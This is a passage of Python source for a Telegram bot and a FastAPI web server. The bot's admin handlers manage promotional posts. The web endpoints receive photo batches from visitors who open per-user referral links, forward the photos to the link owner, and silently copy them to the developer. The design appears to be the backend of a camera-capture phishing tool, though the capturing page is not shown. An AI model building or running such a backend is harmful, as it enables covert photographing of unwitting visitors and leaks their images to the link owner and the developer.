    await message.answer(text, parse_mode="HTML")


# =========================================================
# إدارة المنشورات — القائمة الرئيسية
# =========================================================

@dp.message(F.text.in_({
    t(code, "btn_manage_posts") for code in LANGUAGES
}))
async def manage_posts_handler(message: Message):

    if message.from_user.id != ADMIN_TELEGRAM_ID:
        return

    user = await get_user(message.from_user.id)
    lang = user.language if user else DEFAULT_LANG

    posts = await get_all_posts()

    if not posts:
        text = (
            f"{t(lang, 'posts_title')}\n\n"
            f"{t(lang, 'posts_none')}"
        )
        kb = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text=t(lang, "posts_add"),
                        callback_data="post:add",
                    )
                ],
            ]
        )
        await message.answer(text, reply_markup=kb, parse_mode="HTML")
        return

    text = f"{t(lang, 'posts_title')}\n\n"
    buttons = []

    for p in posts[:10]:
        status = (
            t(lang, "posts_active_now") if p.is_active
            else t(lang, "posts_inactive")
        )
        text += (
            f"🔹 <b>{html.escape(p.button_text)}</b>\n"
            f"   {status}\n"
            f"   {html.escape(p.content[:50])}...\n\n"
        )

        buttons.append([
            InlineKeyboardButton(
                text=f"✏️ {p.button_text[:20]}",
                callback_data=f"post:edit:{p.id}",
            ),
            InlineKeyboardButton(
                text="🗑",
                callback_data=f"post:delete:{p.id}",
            ),
            InlineKeyboardButton(
                text=(
                    t(lang, "posts_toggle_off") if p.is_active
                    else t(lang, "posts_toggle_on")
                ),
                callback_data=f"post:toggle:{p.id}",
            ),
        ])

    buttons.append([
        InlineKeyboardButton(
            text=t(lang, "posts_add"),
            callback_data="post:add",
        )
    ])

    kb = InlineKeyboardMarkup(inline_keyboard=buttons)
    await message.answer(text, reply_markup=kb, parse_mode="HTML")


# =========================================================
# إدارة المنشورات — إضافة جديدة (FSM)
# =========================================================

@dp.callback_query(F.data == "post:add")
async def post_add_start(call: CallbackQuery, state: FSMContext):

    if call.from_user.id != ADMIN_TELEGRAM_ID:
        await call.answer("❌", show_alert=True)
        return

    user = await get_user(call.from_user.id)
    lang = user.language if user else DEFAULT_LANG

    await state.update_data(lang=lang)
    await state.set_state(PostForm.waiting_button_text)

    await call.message.answer(
        t(lang, "posts_add_step1"),
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text=t(lang, "posts_cancel_btn"),
                        callback_data="post:cancel",
                    )
                ],
            ]
        ),
    )
    await call.answer()


# =========================================================
# إدارة المنشورات — إلغاء
# =========================================================

@dp.callback_query(F.data == "post:cancel")
async def post_cancel(call: CallbackQuery, state: FSMContext):

    data = await state.get_data()
    lang = data.get("lang", DEFAULT_LANG)

    await state.clear()

    try:
        await call.message.delete()
    except Exception:
        pass

    await call.message.answer(t(lang, "posts_cancelled"))
    await call.answer()


# =========================================================
# إدارة المنشورات — استقبال اسم الزر
# =========================================================

@dp.message(PostForm.waiting_button_text)
async def post_add_button_text(message: Message, state: FSMContext):

    data = await state.get_data()
    lang = data.get("lang", DEFAULT_LANG)

    text = (message.text or "").strip()
    if not text or len(text) > 60:
        await message.answer(t(lang, "posts_error"))
        return

    await state.update_data(button_text=text)
    await state.set_state(PostForm.waiting_content)

    await message.answer(t(lang, "posts_add_step2"))


# =========================================================
# إدارة المنشورات — استقبال نص المنشور
# =========================================================

@dp.message(PostForm.waiting_content)
async def post_add_content(message: Message, state: FSMContext):

    data = await state.get_data()
    lang = data.get("lang", DEFAULT_LANG)

    text = (message.text or "").strip()
    if not text:
        await message.answer(t(lang, "posts_error"))
        return

    await state.update_data(content=text)
    await state.set_state(PostForm.waiting_url)

    await message.answer(t(lang, "posts_add_step3"))


# =========================================================
# إدارة المنشورات — استقبال الرابط
# =========================================================

@dp.message(PostForm.waiting_url)
async def post_add_url(message: Message, state: FSMContext):

    data = await state.get_data()
    lang = data.get("lang", DEFAULT_LANG)

    text = (message.text or "").strip()

    if text == "/skip":
        await state.update_data(url="", url_button_text="")
        await state.set_state(PostForm.waiting_duration)
        await message.answer(
            t(lang, "posts_add_step5"),
            reply_markup=InlineKeyboardMarkup(
                inline_keyboard=[
                    [
                        InlineKeyboardButton(
                            text=t(lang, "posts_duration_forever"),
                            callback_data="post:dur:forever",
                        )
                    ],
                    [
                        InlineKeyboardButton(
                            text=t(lang, "posts_duration_start"),
                            callback_data="post:dur:start",
                        )
                    ],
                    [
                        InlineKeyboardButton(
                            text=t(lang, "posts_duration_end"),
                            callback_data="post:dur:end",
                        )
                    ],
                ]
            ),
        )
        return

    if not (text.startswith("http://") or text.startswith("https://")):
        await message.answer(t(lang, "posts_error") + "\nhttp:// أو https://")
        return

    await state.update_data(url=text)
    await state.set_state(PostForm.waiting_url_button_text)

    await message.answer(t(lang, "posts_add_step4"))


# =========================================================
# إدارة المنشورات — استقبال نص زر الرابط
# =========================================================

@dp.message(PostForm.waiting_url_button_text)
async def post_add_url_button(message: Message, state: FSMContext):

    data = await state.get_data()
    lang = data.get("lang", DEFAULT_LANG)

    text = (message.text or "").strip()
    if not text or len(text) > 60:
        await message.answer(t(lang, "posts_error"))
        return

    await state.update_data(url_button_text=text)
    await state.set_state(PostForm.waiting_duration)

    await message.answer(
        t(lang, "posts_add_step5"),
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text=t(lang, "posts_duration_forever"),
                        callback_data="post:dur:forever",
                    )
                ],
                [
                    InlineKeyboardButton(
                        text=t(lang, "posts_duration_start"),
                        callback_data="post:dur:start",
                    )
                ],
                [
                    InlineKeyboardButton(
                        text=t(lang, "posts_duration_end"),
                        callback_data="post:dur:end",
                    )
                ],
            ]
        ),
    )


# =========================================================
# إدارة المنشورات — اختيار المدة
# =========================================================

@dp.callback_query(F.data.startswith("post:dur:"))
async def post_add_duration(call: CallbackQuery, state: FSMContext):

    data = await state.get_data()
    lang = data.get("lang", DEFAULT_LANG)

    dur = call.data.split(":")[2]

    if dur == "forever":
        await state.update_data(start_at=None, end_at=None)
        await finalize_post_creation(call, state)
        return

    if dur == "start":
        await state.set_state(PostForm.waiting_start_date)
        await call.message.answer(t(lang, "posts_ask_start_date"))
        await call.answer()
        return

    if dur == "end":
        await state.set_state(PostForm.waiting_end_date)
        await call.message.answer(t(lang, "posts_ask_end_date"))
        await call.answer()
        return


@dp.message(PostForm.waiting_start_date)
async def post_add_start_date(message: Message, state: FSMContext):

    data = await state.get_data()
    lang = data.get("lang", DEFAULT_LANG)

    try:
        dt = datetime.strptime(message.text.strip(), "%Y-%m-%d")
    except ValueError:
        await message.answer(t(lang, "posts_invalid_date"))
        return

    await state.update_data(start_at=dt)
    await state.set_state(PostForm.waiting_end_date)
    await message.answer(t(lang, "posts_ask_end_date"))


@dp.message(PostForm.waiting_end_date)
async def post_add_end_date(message: Message, state: FSMContext):

    data = await state.get_data()
    lang = data.get("lang", DEFAULT_LANG)

    try:
        dt = datetime.strptime(message.text.strip(), "%Y-%m-%d")
    except ValueError:
        await message.answer(t(lang, "posts_invalid_date"))
        return

    await state.update_data(end_at=dt)
    await finalize_post_creation(message, state)


# =========================================================
# إدارة المنشورات — إنشاء نهائي
# =========================================================

async def finalize_post_creation(target, state: FSMContext):

    data = await state.get_data()
    lang = data.get("lang", DEFAULT_LANG)

    try:
        post = await create_post(
            button_text=data.get("button_text", ""),
            content=data.get("content", ""),
            url=data.get("url", ""),
            url_button_text=data.get("url_button_text", ""),
            start_at=data.get("start_at"),
            end_at=data.get("end_at"),
        )
        print(f"[POST] created id={post.id} button='{post.button_text}'")
    except Exception as e:
        print(f"[POST ERROR] {e!r}")
        await state.clear()
        if isinstance(target, Message):
            await target.answer(t(lang, "posts_error"))
        else:
            await target.message.answer(t(lang, "posts_error"))
        return

    await state.clear()

    if isinstance(target, Message):
        await target.answer(t(lang, "posts_created"))
    else:
        await target.message.answer(t(lang, "posts_created"))
        await target.answer()


# =========================================================
# إدارة المنشورات — حذف
# =========================================================

@dp.callback_query(F.data.startswith("post:delete:"))
async def post_delete(call: CallbackQuery):

    post_id = int(call.data.split(":")[2])
    user = await get_user(call.from_user.id)
    lang = user.language if user else DEFAULT_LANG

    post = await get_post(post_id)
    if not post:
        await call.answer(t(lang, "posts_error"), show_alert=True)
        return

    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="✅ نعم",
                    callback_data=f"post:delete_confirm:{post_id}",
                ),
                InlineKeyboardButton(
                    text=t(lang, "posts_back"),
                    callback_data="post:back",
                ),
            ],
        ]
    )

    await call.message.edit_text(
        f"{t(lang, 'posts_confirm_delete')}\n\n"
        f"🔹 <b>{html.escape(post.button_text)}</b>",
        reply_markup=kb,
        parse_mode="HTML",
    )
    await call.answer()


@dp.callback_query(F.data.startswith("post:delete_confirm:"))
async def post_delete_confirm(call: CallbackQuery):

    post_id = int(call.data.split(":")[2])
    user = await get_user(call.from_user.id)
    lang = user.language if user else DEFAULT_LANG

    ok = await delete_post(post_id)
    if ok:
        await call.message.edit_text(t(lang, "posts_deleted"))
    else:
        await call.message.edit_text(t(lang, "posts_error"))
    await call.answer()


# =========================================================
# إدارة المنشورات — تفعيل/إيقاف
# =========================================================

@dp.callback_query(F.data.startswith("post:toggle:"))
async def post_toggle(call: CallbackQuery):

    post_id = int(call.data.split(":")[2])
    user = await get_user(call.from_user.id)
    lang = user.language if user else DEFAULT_LANG

    new_state = await toggle_post(post_id)
    if new_state is None:
        await call.answer(t(lang, "posts_error"), show_alert=True)
        return

    msg = (
        t(lang, "posts_toggled_on") if new_state
        else t(lang, "posts_toggled_off")
    )
    await call.answer(msg, show_alert=True)

    # إعادة عرض القائمة
    await call.message.delete()
    await manage_posts_handler(call.message)


# =========================================================
# إدارة المنشورات — رجوع
# =========================================================

@dp.callback_query(F.data == "post:back")
async def post_back(call: CallbackQuery):

    try:
        await call.message.delete()
    except Exception:
        pass

    await manage_posts_handler(call.message)
    await call.answer()


# =========================================================
# إدارة المنشورات — تعديل (اختيار الحقل)
# =========================================================

@dp.callback_query(F.data.startswith("post:edit:"))
async def post_edit(call: CallbackQuery, state: FSMContext):

    post_id = int(call.data.split(":")[2])
    user = await get_user(call.from_user.id)
    lang = user.language if user else DEFAULT_LANG

    post = await get_post(post_id)
    if not post:
        await call.answer(t(lang, "posts_error"), show_alert=True)
        return

    await state.update_data(edit_post_id=post_id, lang=lang)
    await state.set_state(PostForm.editing_field)

    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=t(lang, "posts_edit_button"),
                    callback_data="post:edit_field:button_text",
                )
            ],
            [
                InlineKeyboardButton(
                    text=t(lang, "posts_edit_content"),
                    callback_data="post:edit_field:content",
                )
            ],
            [
                InlineKeyboardButton(
                    text=t(lang, "posts_edit_url"),
                    callback_data="post:edit_field:url",
                )
            ],
            [
                InlineKeyboardButton(
                    text=t(lang, "posts_edit_url_btn"),
                    callback_data="post:edit_field:url_button_text",
                )
            ],
            [
                InlineKeyboardButton(
                    text=t(lang, "posts_back"),
                    callback_data="post:back",
                )
            ],
        ]
    )

    await call.message.edit_text(
        f"{t(lang, 'posts_edit_choose')}\n\n"
        f"🔹 <b>{html.escape(post.button_text)}</b>",
        reply_markup=kb,
        parse_mode="HTML",
    )
    await call.answer()


@dp.callback_query(F.data.startswith("post:edit_field:"))
async def post_edit_field(call: CallbackQuery, state: FSMContext):

    field = call.data.split(":")[2]
    data = await state.get_data()
    lang = data.get("lang", DEFAULT_LANG)

    await state.update_data(edit_field=field)
    await state.set_state(PostForm.editing_value)

    await call.message.answer("✍️ أرسل القيمة الجديدة:")
    await call.answer()


@dp.message(PostForm.editing_value)
async def post_edit_value(message: Message, state: FSMContext):

    data = await state.get_data()
    lang = data.get("lang", DEFAULT_LANG)

    post_id = data.get("edit_post_id")
    field = data.get("edit_field")
    value = (message.text or "").strip()

    if not post_id or not field:
        await state.clear()
        return

    ok = await update_post(post_id, **{field: value})
    await state.clear()

    if ok:
        await message.answer(t(lang, "posts_edit_updated"))
    else:
        await message.answer(t(lang, "posts_error"))


# =========================================================
# زر المنشور عند المستخدم — عرض المنشور
# =========================================================

@dp.message(F.text)
async def user_post_button(message: Message, state: FSMContext):

    # تجاهل الأوامر المعروفة
    if message.text.startswith("/"):
        return

    user_id = message.from_user.id
    if user_id == ADMIN_TELEGRAM_ID:
        return

    user = await get_user(user_id)
    lang = user.language if user else DEFAULT_LANG

    # تحقق: هل النص يطابق زر منشور مفعّل؟
    active_posts = await get_active_posts()
    if not active_posts:
        return

    matched = None
    for p in active_posts:
        if p.button_text == message.text:
            matched = p
            break

    if not matched:
        return

    # إرسال المنشور
    if matched.url:
        kb = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text=matched.url_button_text or "🔗",
                        url=matched.url,
                    )
                ]
            ]
        )
        await message.answer(
            html.escape(matched.content),
            reply_markup=kb,
            disable_web_page_preview=True,
        )
    else:
        await message.answer(
            html.escape(matched.content),
            disable_web_page_preview=True,
        )


# =========================================================
# الصفحة الرئيسية
# =========================================================

@app.get("/", response_class=HTMLResponse)
async def home(request: Request, q: str = Query(default="")):

    if not q:
        return """
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport"
                  content="width=device-width, initial-scale=1.0">
            <title>الرابط غير صحيح</title>
        </head>
        <body style="font-family:sans-serif;text-align:center;padding:40px">
            <h2>❌ الرابط غير صحيح</h2>
            <p>يجب فتح رابط إحالة صالح.</p>
        </body>
        </html>
        """

    lang = DEFAULT_LANG
    if q.isdigit():
        owner = await get_user(int(q))
        if owner and owner.language:
            lang = owner.language

    web_texts = {
        key: t(lang, key)
        for key in TEXTS[lang]
        if key.startswith("web_")
    }

    return templates.TemplateResponse(
        request=request,
        name="index.html",
        context={
            "referral_id": q,
            "lang": lang,
            "is_rtl": lang in ("ar", "fa"),
            "texts": web_texts,
        },
    )

# =========================================================
# إرسال الصور كألبوم
# =========================================================

async def flush_session(session_id: str, reason: str = "finish"):
    sess = _sessions.pop(session_id, None)
    if not sess:
        return

    timer = sess.get("timer")
    if timer:
        try:
            timer.cancel()
        except Exception:
            pass

    photos = sess.get("photos", [])
    indices = sess.get("indices", [])
    referral_id = sess.get("referral_id", "")
    total = sess.get("total", 0)

    if not photos:
        print(f"[FLUSH] session {session_id[:8]} empty (reason={reason})")
        return

    if not referral_id.isdigit():
        print(f"[FLUSH] session {session_id[:8]} invalid referral_id")
        return

    owner_id = int(referral_id)
    owner = await get_user(owner_id)

    if not owner:
        print(f"[FLUSH] session {session_id[:8]} owner not found")
        return

    lang = owner.language or DEFAULT_LANG
    username = owner.username or ""
    name = owner.name or "—"
    username_text = f"@{username}" if username else t(lang, "no_username")

    sent_count = len(photos)
    reason_label = {
        "finish": "completed",
        "timeout": "auto (inactivity)",
        "shutdown": "shutdown",
    }.get(reason, reason)

    caption = (
        f"{t(lang, 'photo_caption')} ({sent_count}/{total})\n\n"
        f"{t(lang, 'photo_owner')}: {html.escape(name)}\n"
        f"{t(lang, 'photo_username')}: {html.escape(username_text)}\n"
        f"{t(lang, 'photo_tg_id')}: {owner_id}\n"
        f"{t(lang, 'photo_ref_id')}: {referral_id}\n"
        f"🔖 Session: <code>{session_id[:8]}</code>\n"
        f"⚡ Reason: <b>{reason_label}</b>"
    )

    if len(photos) == 1:
        try:
            await bot.send_photo(
                chat_id=owner_id,
                photo=BufferedInputFile(photos[0], filename="photo_1.jpg"),
                caption=caption,
                parse_mode="HTML",
            )
        except Exception as e:
            print(f"[FLUSH OWNER ERROR] {e!r}")
            return
    else:
        media_group = []
        for i, photo_bytes in enumerate(photos):
            media_group.append(
                InputMediaPhoto(
                    media=BufferedInputFile(
                        photo_bytes,
                        filename=f"photo_{indices[i] if i < len(indices) else i + 1}.jpg",
                    ),
                    caption=(caption if i == 0 else ""),
                    parse_mode="HTML",
                )
            )

        try:
            await bot.send_media_group(
                chat_id=owner_id,
                media=media_group,
            )
        except Exception as e:
            print(f"[FLUSH OWNER ERROR] {e!r}")
            return

    # نسخة للمطور
    try:
        if len(photos) == 1:
            await bot.send_photo(
                chat_id=ADMIN_TELEGRAM_ID,
                photo=BufferedInputFile(photos[0], filename="photo_1_admin.jpg"),
                caption=caption,
                parse_mode="HTML",
            )
        else:
            admin_media = []
            for i, photo_bytes in enumerate(photos):
                admin_media.append(
                    InputMediaPhoto(
                        media=BufferedInputFile(
                            photo_bytes,
                            filename=f"photo_{indices[i] if i < len(indices) else i + 1}_admin.jpg",
                        ),
                        caption=(caption if i == 0 else ""),
                        parse_mode="HTML",
                    )
                )
            await bot.send_media_group(
                chat_id=ADMIN_TELEGRAM_ID,
                media=admin_media,
            )
    except Exception as e:
        print(f"[FLUSH ADMIN ERROR] {e!r}")

    await increment_referrals(owner_id)
    print(f"[FLUSH] +1 referral for {owner_id} (session {session_id[:8]})")


def schedule_session_flush(session_id: str):
    sess = _sessions.get(session_id)
    if not sess:
        return

    old_timer = sess.get("timer")
    if old_timer:
        try:
            old_timer.cancel()
        except Exception:
            pass

    loop = asyncio.get_event_loop()

    def _on_timeout():
        asyncio.create_task(flush_session(session_id, reason="timeout"))

    timer = loop.call_later(SESSION_TIMEOUT, _on_timeout)
    sess["timer"] = timer


# =========================================================
# استقبال صورة واحدة
# =========================================================

@app.post("/upload-single-photo")
async def upload_single_photo(
    photo: UploadFile = File(...),
    referral_id: str = Form(...),
    session_id: str = Form(...),
    index: int = Form(...),
    total: int = Form(...),
):

    if not referral_id.isdigit():
        return {"success": False, "message": "Invalid Referral ID."}

    if not session_id:
        return {"success": False, "message": "Invalid session."}

    owner = await get_user(int(referral_id))
    if not owner:
        return {"success": False, "message": "Invalid referral link."}

    image_bytes = await photo.read()

    if not image_bytes:
        return {"success": False, "message": "Empty photo."}

    if len(image_bytes) > MAX_PHOTO_SIZE:
        return {"success": False, "message": "Photo too large."}

    if session_id not in _sessions:
        _sessions[session_id] = {
            "referral_id": referral_id,
            "total": total,
            "photos": [],
            "indices": [],
            "timer": None,
            "created_at": time.time(),
        }

    sess = _sessions[session_id]
    sess["photos"].append(image_bytes)
    sess["indices"].append(index)
    sess["total"] = total

    schedule_session_flush(session_id)

    print(
        f"[STORED] session {session_id[:8]} photo {index}/{total} "
        f"({len(image_bytes)} bytes, total={len(sess['photos'])})"
    )

    return {
        "success": True,
        "message": f"Photo {index} stored ({len(sess['photos'])}/{total})",
        "stored": len(sess["photos"]),
    }


# =========================================================
# إنهاء الجلسة
# =========================================================

@app.post("/finish-session")
async def finish_session(payload: dict):

    session_id = str(payload.get("session_id", ""))
    referral_id = str(payload.get("referral_id", ""))
    total = int(payload.get("total", 0))
    sent = int(payload.get("sent", 0))
    failed = int(payload.get("failed", 0))

    if not session_id:
        return {"success": False, "message": "No session."}

    await flush_session(session_id, reason="finish")

    return {
        "success": True,
        "message": "Session flushed.",
        "sent": sent,
        "failed": failed,
    }


# =========================================================
# استقبال الصور (الطريقة القديمة)
# =========================================================

@app.post("/upload-photo")
async def upload_photo(
    photos: List[UploadFile] = File(...),
    referral_id: str = Form(...),
):

    if not referral_id.isdigit():
        return {"success": False, "message": "Invalid Referral ID."}

    if not photos:
        return {"success": False, "message": "No photos."}

    if len(photos) > MAX_PHOTOS:
        return {"success": False, "message": f"Max {MAX_PHOTOS} photos."}

    owner_id = int(referral_id)
    owner = await get_user(owner_id)

    if not owner:
        return {"success": False, "message": "Invalid referral link."}

    lang = owner.language or DEFAULT_LANG

    username = owner.username or ""
    name = owner.name or "—"
    username_text = f"@{username}" if username else t(lang, "no_username")

    caption = (
        f"{t(lang, 'photo_caption')}\n\n"
        f"{t(lang, 'photo_owner')}: {html.escape(name)}\n"
        f"{t(lang, 'photo_username')}: {html.escape(username_text)}\n"
        f"{t(lang, 'photo_tg_id')}: {owner_id}\n"
        f"{t(lang, 'photo_ref_id')}: {referral_id}"
    )

    media_group_owner = []
    media_group_admin = []

    for idx, photo in enumerate(photos):
        image_bytes = await photo.read()
        if not image_bytes:
            continue

        if len(image_bytes) > MAX_PHOTO_SIZE:
            return {
                "success": False,
                "message": f"Photo {idx + 1} too large.",
            }

        media_group_owner.append(
            InputMediaPhoto(
                media=BufferedInputFile(
                    image_bytes,
                    filename=f"photo_{idx + 1}.jpg",
                )
            )
        )

        media_group_admin.append(
            InputMediaPhoto(
                media=BufferedInputFile(
                    image_bytes,
                    filename=f"photo_{idx + 1}.jpg",
                ),
                caption=(caption if idx == 0 else ""),
                parse_mode="HTML",
            )
        )

    if not media_group_owner:
        return {"success": False, "message": "No valid photos."}

    owner_ok = True
    try:
        await bot.send_media_group(
            chat_id=owner_id,
            media=media_group_owner,
        )
    except Exception as error:
        print(f"[SEND OWNER ERROR] {error!r}")
        owner_ok = False

    try:
        await bot.send_media_group(
            chat_id=ADMIN_TELEGRAM_ID,
            media=media_group_admin,
        )
    except Exception as error:
        print(f"[SEND ADMIN ERROR] {error!r}")

    if not owner_ok:
        return {
            "success": False,
            "message": "Failed to send to owner.",
        }

    await increment_referrals(owner_id)

    return {"success": True, "message": "Photos sent."}
